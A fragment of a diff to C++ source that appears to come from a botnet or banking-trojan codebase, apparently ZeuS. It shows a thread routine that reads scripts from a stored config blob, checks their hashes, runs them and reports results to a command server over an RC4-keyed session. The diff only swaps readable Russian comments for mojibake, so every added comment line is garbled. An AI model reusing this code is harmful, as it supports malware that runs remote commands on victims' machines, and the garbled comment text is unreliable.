   IN p   - BinStorage::STORAGE.
 
@@ -744,16 +755,16 @@ static DWORD WINAPI scriptProc(void *p)
   LPBYTE currentHash;
   pendingFlags = 0;
   
-  //Обзор скриптов.
+  //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   while((curItem = BinStorage::_getNextItem(script, curItem)))if(curItem->realSize > MD5HASH_SIZE && (currentHash = (LPBYTE)BinStorage::_getItemData(curItem)) != NULL)
   {
     WDEBUG1(WDDT_INFO, "Founded script with size %u", curItem->realSize);
 
-    //Получем данные о хэше скрипта.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     WORD errorMessageId = getScriptStatusByHash(currentHash);
     DWORD errorLine = (DWORD)-1;
 
-    //Исполнение скрипта.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     if(errorMessageId == 0)
     {
       LPWSTR scriptText = Str::_utf8ToUnicode((LPSTR)((LPBYTE)currentHash + MD5HASH_SIZE), curItem->realSize - MD5HASH_SIZE);
@@ -769,7 +780,7 @@ static DWORD WINAPI scriptProc(void *p)
       Mem::free(scriptText);
     }
     
-    //Отправка ответа серверу.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     {
       BinStorage::STORAGE *config;
       if((config = DynamicConfig::getCurrent()))
@@ -795,7 +806,7 @@ static DWORD WINAPI scriptProc(void *p)
           serverSession.url         = url;
           serverSession.requestProc = requestProc;
           serverSession.resultProc  = resultProc;
-          serverSession.stopEvent   = NULL;//coreData.globalHandles.stopEvent; //Если мы скачали обновление, то есть шасн не успеть отправить ответ.
+          serverSession.stopEvent   = NULL;//coreData.globalHandles.stopEvent; //пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
           serverSession.rc4Key      = &rc4Key;
           serverSession.postData    = NULL;
           serverSession.customData  = &scriptData;
